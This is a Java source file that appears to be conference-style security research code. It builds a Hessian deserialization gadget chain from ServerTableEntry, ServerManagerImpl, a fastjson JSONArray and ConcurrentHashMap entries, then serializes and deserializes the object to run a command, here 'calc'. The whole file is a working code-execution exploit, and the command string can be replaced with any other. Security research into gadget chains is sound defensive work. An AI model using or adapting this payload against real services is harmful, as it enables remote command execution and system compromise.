package com.test.gadget.blackhat2025;

import com.alibaba.fastjson.JSONArray;
import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.deploy.nativesandbox.IntegrityProcess;
import com.sun.org.apache.xpath.internal.objects.XStringForFSB;
import tools.HessianTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import javax.sound.sampled.AudioFileFormat;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;

public class ConcurrentHashMap2equals {
    public static void main(String[] args) throws Exception {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessianSer2bytes(payload, "2");
        HessianTools.hessianDeser(bytes, "2");
    }

    public static Object getPayload() throws Exception {
        Object entry = UnsafeTools.getObjectByUnsafe(ServerTableEntry.class);
        // process.exit不能报错；linux下使用UNIXProcess即可
        Object process = UnsafeTools.getObjectByUnsafe(IntegrityProcess.class);
        ReflectTools.setFieldValue(entry, "state", 2);
        ReflectTools.setFieldValue(entry, "process", process);
        ReflectTools.setFieldValue(entry, "activationCmd", "calc");

        HashMap<Object, Object> hashMap = new HashMap<>();
        // 键一定是Integer
        hashMap.put(1, entry);

        Object serverManager = UnsafeTools.getObjectByUnsafe(ServerManagerImpl.class);
        ReflectTools.setFieldValue(serverManager, "serverTable", hashMap);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(serverManager);

        Object audio = UnsafeTools.getObjectByUnsafe(AudioFileFormat.Type.class);

//        Object xString = UnsafeTools.getObjectByUnsafe(XStringForFSB.class);
//        ReflectTools.setFieldValue(xString, "m_strCache", "notNull1");

        Class<?> aClass = Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry");
        Object conHashMap1 = UnsafeTools.getObjectByUnsafe(aClass);
        Object conHashMap2 = UnsafeTools.getObjectByUnsafe(aClass);
        ReflectTools.setFieldValue(conHashMap1, "key", audio);
        ReflectTools.setFieldValue(conHashMap1, "val", jsonArray);
        ReflectTools.setFieldValue(conHashMap2, "key", jsonArray);
        ReflectTools.setFieldValue(conHashMap2, "val", audio);

        ConcurrentHashMap<Object, Object> finalMap = ReflectTools.makeConcurrentMap(conHashMap1, conHashMap2);

        return finalMap;
    }
}
